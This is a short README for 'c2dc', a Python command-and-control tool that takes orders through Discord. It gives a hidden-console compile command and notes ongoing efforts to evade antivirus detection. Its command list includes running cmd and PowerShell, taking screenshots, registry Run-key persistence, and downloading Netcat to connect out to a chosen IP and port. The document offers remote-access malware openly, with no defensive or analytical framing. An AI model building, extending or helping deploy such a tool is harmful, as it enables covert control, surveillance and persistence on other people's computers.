# c2dc
Command and control made in python with discord api.

## Compile
> python -m nuitka --mingw64 .\main.py --standalone --onefile --windows-disable-console - - enable-static
- Antivirus and browser will detect it as virus.

## Obfuscate 
> Trying to figure out how to avoid AV detection

# Commands

    help - Help command
    cd - Change directory
    ls - List directory
    upload <link> - Upload file
    cmd - Execute cmd.exe command
    shell - Execute powershell.exe command
    exit - Exit the session
    screenshot - Take a screenshot
    persist <name> - Create a registry key to Run the file.exe
    getNC - Download Netcat
    useNC <ip> <port> - Use Netcat
